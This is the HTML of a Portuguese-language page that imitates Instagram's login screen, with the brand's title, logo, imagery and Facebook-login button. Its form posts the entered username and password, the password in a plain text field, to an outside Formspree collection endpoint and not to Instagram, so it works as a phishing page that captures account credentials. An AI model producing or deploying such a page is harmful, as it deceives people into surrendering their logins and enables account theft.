<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link type="image/png" sizes="32x32" rel="icon" href="./images/instagram-favicon.png">
    <link rel="stylesheet" href="./style.css">
    <title>Instagram</title>
</head>
<body>
    <main id="main">
        <div  class="wrapper">
                <div class="instagram-phone">
                    <img src="./images/instagram-celular.png " alt="celular com fotos do feed do instagram" >
                </div>

                <div class="instagram-login">
                    <div class="group">
                        <img src="./images/instagram-logo.png" class="instagram-logo" alt="isntagram-logo" aria-label="logo com o nome instagram">
                        <div class="form">
                            <form action="https://formspree.io/f/mvojwwvb"
                            method="POST">
                                <div class="field">
                                    <input name="test" id="name" type="text" placeholder="Telefone, nome de usuário ou email" aria-label for="Telefone, nome de usuário ou email" autocomplete="off" required/>
                                </div>
    
                                <div class="field">
                                    <input name="passw" id="pass" type="text" placeholder="Senha" aria-label for="pass" autocomplete="off" required/>
                                </div>
    
                                <button class="login-button" title="login" type="submit" aria-label="botão entrar"> Entrar </button>
                

                                <div class="separator">
                                    <div class="line"></div>
                                    <p>OU</p>
                                    <div class="line"></div>
                                </div>
    
                                <div class="outro">
                                    <button class="fb-login-btn" type="button" aria-label="botão entrar com o Facebook">
                                        <i class="fa-brands fa-facebook-square"></i>
                                        <span class="login-with-fb">
                                            Entrar com o Facebook
                                        </span>
                                    </button>
                            
                                    <p class="forgot-password"><a href="#"> Esqueceu a senha? </a></p>
                                </div>

                            </form>
                        </div>
                    </div>
                    <div class="group sign-up">
                        Não tem uma conta? <a class="sign-up" href="#"> Cadastre-se </a>
                    </div>
                    <div class="get-the-app">
                        <p> Obtenha o aplicativo.</p>
                        <div class="download">
                            <a href="#" class="app-download"></a>
                            <a href="#" class="app-download"></a>
                        </div>
                    </div>
                </div>
        </div>

        <footer>
            <div class="social-links">

            </div>
        </footer>
    </main>
    
</body>
</html>
